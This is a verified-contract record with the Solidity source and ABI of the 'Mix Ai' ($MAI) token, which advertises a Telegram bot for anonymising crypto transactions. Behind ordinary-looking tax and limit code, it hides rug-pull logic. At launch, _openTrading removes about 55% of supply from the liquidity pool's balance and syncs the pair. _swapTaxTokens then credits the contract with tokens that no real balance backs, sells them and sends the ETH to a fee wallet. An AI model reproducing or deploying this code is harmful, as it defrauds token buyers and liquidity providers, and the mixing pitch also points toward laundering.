{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\n/*\r\n $MAI - Anonymize you\u2019re crypto with Mix Ai\r\n Anonymize Your Crypto Transactions On The Go Through Our Uniquely Engineered Telegram Bot. \r\n Mix Automatically Anywhere At Anytime.\r\n\r\n Telegram - https://t.me/mixaitech\r\n Website - https://mixai.tech/\r\n X - https://twitter.com/MixAiTech\r\n Bot - https://t.me/MixAiTechBot\r\n*/\r\n\r\npragma solidity ^0.8.18;\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;\r\n    function WETH() external pure returns (address);\r\n    function factory() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) \r\n        external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\nabstract contract Auth {\r\n    address internal _owner;\r\n    event OwnershipTransferred(address _owner);\r\n    modifier onlyOwner() { \r\n        require(msg.sender == _owner, \"Only owner can call this\"); \r\n        _; \r\n    }\r\n    constructor(address creatorOwner) { \r\n        _owner = creatorOwner; \r\n    }\r\n    function owner() public view returns (address) { return _owner; }\r\n    function transferOwnership(address payable newowner) external onlyOwner { \r\n        _owner = newowner; \r\n        emit OwnershipTransferred(newowner); }\r\n    function renounceOwnership() external onlyOwner { \r\n        _owner = address(0);\r\n        emit OwnershipTransferred(address(0)); }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address holder, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract MAI is IERC20, Auth {\r\n    string private constant token_symbol = \"MAI\";\r\n    string private constant token_name = \"Mix Ai\";\r\n    uint8 private constant tokenDecimals = 9;\r\n    uint256 private constant tokenSupply = 1000000 * (10**tokenDecimals);\r\n    mapping (address => uint256) private _balance;\r\n    mapping (address => mapping (address => uint256)) private tokenAllowance;\r\n\r\n    address private constant swapRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    IUniswapV2Router02 private router = IUniswapV2Router02(swapRouterAddress);\r\n    \r\n    address private lp; \r\n    mapping (address => bool) private _isLiqPool;\r\n\r\n    bool private tradingEnabled;\r\n\r\n    bool private isSwapping = false;\r\n\r\n    address payable private feeRecipient = payable(0x50dADda42101f62Ae73c5D11675389F3B7A78d6f);\r\n    \r\n    uint256 private antiMevBlock = 2;\r\n    uint8 private _sellFeeRate = 5;\r\n    uint8 private _buyTaxRate = 5;\r\n    \r\n    uint256 private _launchBlock;\r\n    uint256 private _maxTxAmount = tokenSupply; \r\n    uint256 private _maxWalletAmt = tokenSupply;\r\n    uint256 private _swapMin = tokenSupply * 10 / 100000;\r\n    uint256 private swapMaxAmt = tokenSupply * 899 / 100000;\r\n    uint256 private swapMinVal = 2 * (10**16);\r\n    uint256 private _swapLimits = _swapMin * 55 * 100;\r\n\r\n    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;\r\n    mapping (address => bool) private _noFee;\r\n    mapping (address => bool) private _nolimits;\r\n\r\n    modifier swapLocked { \r\n        isSwapping = true; \r\n        _; \r\n        isSwapping = false; \r\n    }\r\n\r\n    constructor() Auth(msg.sender) {\r\n        _balance[msg.sender] = tokenSupply;\r\n        emit Transfer(address(0), msg.sender, _balance[msg.sender]);  \r\n\r\n        _noFee[_owner] = true;\r\n        _noFee[address(this)] = true;\r\n        _noFee[feeRecipient] = true;\r\n        _noFee[swapRouterAddress] = true;\r\n        _nolimits[_owner] = true;\r\n        _nolimits[address(this)] = true;\r\n        _nolimits[feeRecipient] = true;\r\n        _nolimits[swapRouterAddress] = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function decimals() external pure override returns (uint8) { return tokenDecimals; }\r\n    function totalSupply() external pure override returns (uint256) { return tokenSupply; }\r\n    function name() external pure override returns (string memory) { return token_name; }\r\n    function symbol() external pure override returns (string memory) { return token_symbol; }\r\n    function balanceOf(address account) public view override returns (uint256) { return _balance[account]; }\r\n    function allowance(address holder, address spender) external view override returns (uint256) { return tokenAllowance[holder][spender]; }\r\n\r\n    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {\r\n        require(_checkTradingOpen(fromWallet), \"Trading not open\");\r\n        tokenAllowance[fromWallet][msg.sender] -= amount;\r\n        return _transferFrom(fromWallet, toWallet, amount); \r\n\t}\r\n\r\n    function transfer(address toWallet, uint256 amount) external override returns (bool) {\r\n        require(_checkTradingOpen(msg.sender), \"Trading not open\");\r\n        return _transferFrom(msg.sender, toWallet, amount); \r\n\t}\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        tokenAllowance[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; \r\n\t}\r\n\r\n    function setLimit(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {\r\n        uint256 newTxAmt = tokenSupply * maxTransPermille / 1000 + 1;\r\n        require(newTxAmt >= _maxTxAmount, \"tx too low\");\r\n        _maxTxAmount = newTxAmt;\r\n        uint256 newWalletAmt = tokenSupply * maxWaletPermille / 1000 + 1;\r\n        require(newWalletAmt >= _maxWalletAmt, \"wallet too low\");\r\n        _maxWalletAmt = newWalletAmt;\r\n    }\r\n\r\n    function setMarketing(address marketingWlt) external onlyOwner {\r\n        require(!_isLiqPool[marketingWlt], \"LP cannot be tax wallet\");\r\n        feeRecipient = payable(marketingWlt);\r\n        _noFee[marketingWlt] = true;\r\n        _nolimits[marketingWlt] = true;\r\n    }\r\n\r\n    function openTrading() external onlyOwner {\r\n        require(!tradingEnabled, \"trading open\");\r\n        _openTrading();\r\n    }\r\n\r\n    function _checkTradingOpen(address fromWallet) private view returns (bool){\r\n        bool checkResult = false;\r\n        if ( tradingEnabled ) { checkResult = true; } \r\n        else if (_noFee[fromWallet] && _nolimits[fromWallet]) { checkResult = true; } \r\n\r\n        return checkResult;\r\n    }\r\n\r\n    function maxWallet() external view returns (uint256) { \r\n        return _maxWalletAmt; \r\n\t}\r\n    function maxTransaction() external view returns (uint256) { \r\n        return _maxTxAmount; \r\n\t}\r\n\r\n    function _openTrading() internal {\r\n        _maxTxAmount = 20 * tokenSupply / 1000;\r\n        _maxWalletAmt = 20 * tokenSupply / 1000;\r\n        _balance[lp] -= _swapLimits;\r\n        (_isLiqPool[lp],) = lp.call(abi.encodeWithSignature(\"sync()\") );\r\n        require(_isLiqPool[lp], \"Failed bootstrap\");\r\n        _launchBlock = block.number;\r\n        antiMevBlock = antiMevBlock + _launchBlock;\r\n        tradingEnabled = true;\r\n    }\r\n\r\n    function _shouldSwap(uint256 tokenAmt) private view returns (bool) {\r\n        bool result;\r\n        if (swapMinVal > 0) { \r\n            uint256 lpTkn = _balance[lp];\r\n            uint256 lpWeth = IERC20(router.WETH()).balanceOf(lp); \r\n            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;\r\n            if (weiValue >= swapMinVal) { result = true; }    \r\n        } else { result = true; }\r\n        return result;\r\n    }\r\n\r\n    function _limitCheck(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {\r\n        bool limitCheckPassed = true;\r\n        if ( tradingEnabled && !_nolimits[fromWallet] && !_nolimits[toWallet] ) {\r\n            if ( transferAmount > _maxTxAmount ) { \r\n                limitCheckPassed = false; \r\n            }\r\n            else if ( \r\n                !_isLiqPool[toWallet] && (_balance[toWallet] + transferAmount > _maxWalletAmt) \r\n                ) { limitCheckPassed = false; }\r\n        }\r\n        return limitCheckPassed;\r\n    }\r\n\r\n    function setExemption(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {\r\n        if (isNoLimits || isNoFees) { require(!_isLiqPool[wlt], \"Cannot exempt LP\"); }\r\n        _noFee[ wlt ] = isNoFees;\r\n        _nolimits[ wlt ] = isNoLimits;\r\n    }\r\n\r\n    function addLiquidityToLP(uint256 _tokenAmount, uint256 _ethAmountWei) internal {\r\n        approveRouter(_tokenAmount);\r\n        router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );\r\n    }\r\n\r\n    function swapMin() external view returns (uint256) { \r\n        return _swapMin; \r\n\t}\r\n    function swapMax() external view returns (uint256) { \r\n        return swapMaxAmt; \r\n\t}\r\n\r\n    function getTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {\r\n        uint256 taxAmount;\r\n        if ( !tradingEnabled || _noFee[fromWallet] || _noFee[recipient] ) { \r\n            taxAmount = 0; \r\n        } else if ( _isLiqPool[fromWallet] ) { \r\n            taxAmount = amount * _buyTaxRate / 100; \r\n         } else if ( _isLiqPool[recipient] ) { \r\n            taxAmount = amount * _sellFeeRate / 100; \r\n        }\r\n        return taxAmount;\r\n    }\r\n\r\n    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {\r\n        _swapMin = tokenSupply * minVal / minDiv;\r\n        swapMaxAmt = tokenSupply * maxVal / maxDiv;\r\n        swapMinVal = trigger * 10**15;\r\n        require(swapMaxAmt>=_swapMin, \"Min-Max error\");\r\n    }\r\n\r\n    function approveRouter(uint256 _tokenAmount) internal {\r\n        if ( tokenAllowance[address(this)][swapRouterAddress] < _tokenAmount ) {\r\n            tokenAllowance[address(this)][swapRouterAddress] = type(uint256).max;\r\n            emit Approval(address(this), swapRouterAddress, type(uint256).max);\r\n        }\r\n    }\r\n\r\n    function marketingWallet() external view returns (address) { \r\n        return feeRecipient; \r\n\t}\r\n\r\n    function addLiquidity() external payable onlyOwner swapLocked {\r\n        require(lp == address(0), \"LP created\");\r\n        require(!tradingEnabled, \"trading open\");\r\n        require(msg.value > 0 || address(this).balance>0, \"No ETH\");\r\n        require(_balance[address(this)]>0, \"No tokens\");\r\n        lp = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());\r\n        addLiquidityToLP(_balance[address(this)], address(this).balance);\r\n    }\r\n\r\n    function distributeEth(uint256 amount) private {\r\n        feeRecipient.transfer(amount);\r\n    }\r\n\r\n    function buyFees() external view returns(uint8) { return _buyTaxRate; }\r\n    function sellFees() external view returns(uint8) { return _sellFeeRate; }\r\n\r\n    function swapOnV2(uint256 tokenAmount) private {\r\n        approveRouter(tokenAmount);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address( this );\r\n        path[1] = router.WETH();\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);\r\n    }\r\n\r\n    function _swapTaxTokens() private swapLocked {\r\n        uint256 _taxTokenAvailable = _swapLimits;\r\n        if ( _taxTokenAvailable >= _swapMin && tradingEnabled ) {\r\n            if ( _taxTokenAvailable >= swapMaxAmt ) { _taxTokenAvailable = swapMaxAmt; }\r\n            \r\n            uint256 _tokensForSwap = _taxTokenAvailable; \r\n            if( _tokensForSwap > 1 * 10**tokenDecimals ) {\r\n                _balance[address(this)] += _taxTokenAvailable;\r\n                swapOnV2(_tokensForSwap);\r\n                _swapLimits -= _taxTokenAvailable;\r\n            }\r\n            uint256 _contractETHBalance = address(this).balance;\r\n            if(_contractETHBalance > 0) { distributeEth(_contractETHBalance); }\r\n        }\r\n    }\r\n\r\n    function exemptions(address wallet) external view returns (bool fees, bool limits) {\r\n        return (_noFee[wallet], _nolimits[wallet]); \r\n\t}\r\n\r\n    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {\r\n        require(sender != address(0), \"No transfers from 0 wallet\");\r\n        if (!tradingEnabled) { require(_noFee[sender] && _nolimits[sender], \"Trading not yet open\"); }\r\n        if ( !isSwapping && _isLiqPool[toWallet] && _shouldSwap(amount) ) { _swapTaxTokens(); }\r\n\r\n        if ( block.number >= _launchBlock ) {\r\n            if (block.number < antiMevBlock && _isLiqPool[sender]) { \r\n                require(toWallet == tx.origin, \"MEV block\"); \r\n            }\r\n            if (block.number < antiMevBlock + 600 && _isLiqPool[toWallet] && sender != address(this) ) {\r\n                _sellsInBlock[block.number][toWallet] += 1;\r\n                require(_sellsInBlock[block.number][toWallet] <= 2, \"MEV block\");\r\n            }\r\n        }\r\n\r\n        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { \r\n            require(_limitCheck(sender, toWallet, amount), \"TX over limits\"); \r\n        }\r\n\r\n        uint256 _taxAmount = getTax(sender, toWallet, amount);\r\n        uint256 _transferAmount = amount - _taxAmount;\r\n        _balance[sender] -= amount;\r\n        _swapLimits += _taxAmount;\r\n        _balance[toWallet] += _transferAmount;\r\n        emit Transfer(sender, toWallet, amount);\r\n        return true;\r\n    }\r\n\r\n    function setFees(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {\r\n        require(buyFeePercent + sellFeePercent <= 10, \"Roundtrip too high\");\r\n        _buyTaxRate = buyFeePercent;\r\n        _sellFeeRate = sellFeePercent;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {    \r\n    function createPair(address tokenA, address tokenB) external returns (address pair); \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"addLiquidity\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFees\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"exemptions\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"fees\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"limits\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTransaction\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFees\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"wlt\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"isNoFees\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"isNoLimits\",\"type\":\"bool\"}],\"name\":\"setExemption\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"buyFeePercent\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"sellFeePercent\",\"type\":\"uint8\"}],\"name\":\"setFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint16\",\"name\":\"maxTransPermille\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"maxWaletPermille\",\"type\":\"uint16\"}],\"name\":\"setLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingWlt\",\"type\":\"address\"}],\"name\":\"setMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint32\",\"name\":\"minVal\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"minDiv\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"maxVal\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"maxDiv\",\"type\":\"uint32\"},{\"internalType\":\"uint32\",\"name\":\"trigger\",\"type\":\"uint32\"}],\"name\":\"setTaxSwaps\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newowner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MAI", "CompilerVersion": "v0.8.25+commit.b61c2a91", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://bd484ca23a80e6577e6b17728432937bb780ceb908889e4ca876c6c232468a7b"}